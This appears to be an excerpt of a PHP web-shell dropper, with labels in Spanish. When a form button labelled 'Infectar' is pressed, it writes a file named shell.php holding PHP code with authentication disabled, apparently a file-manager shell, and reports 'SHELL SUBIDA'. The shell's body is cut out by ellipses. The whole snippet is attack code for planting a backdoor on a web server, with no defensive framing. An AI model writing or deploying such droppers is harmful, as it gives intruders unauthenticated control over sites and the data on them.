...
if(isset($_POST['infectar']) and $_POST['infectar'] == 'si'){

$todo = '<?php // Auth with login/password (set true/false to enable/disable it)
$use_auth = false;
...
file_put_contents('shell.php', $todo);

echo '====== SHELL SUBIDA ====='.PHP_EOL;
echo "<br>".PHP_EOL;
echo "nombre del archivo: shell.php".PHP_EOL;

} else {
	echo '
<form action="" method="POST"><input type="hidden" name="infectar" value="si"><input type="submit" value="Infectar"></form>
';
}
 ?>
